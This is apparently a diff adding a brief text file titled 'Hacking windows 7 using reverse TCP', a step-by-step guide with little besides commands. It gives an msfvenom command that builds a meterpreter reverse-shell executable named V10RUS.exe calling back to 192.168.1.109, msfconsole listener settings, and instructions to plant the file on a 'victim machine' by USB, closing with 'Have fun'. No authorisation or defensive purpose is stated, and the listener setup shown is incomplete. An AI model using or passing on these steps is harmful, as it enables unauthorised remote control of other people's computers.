@@ -1,0 +1,16 @@
+Hacking windows 7 using reverse TCP
+
+1/ Create Payload
+
+# msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lport=1291 lhost=192.168.1.109 -f exe -o /root/Desktop/V10RUS.exe
+
+2/ Use Handler
+
+# msfconsole
+	>set lport 1291
+	>set lhost 192.168.1.109
+3/ Copy V10RUS.exe into the USB or something and put it in the victim machine and waiting for the connection
+
+	If you see the meterpreter shell then jump to the next step
+
+4/ Have fun
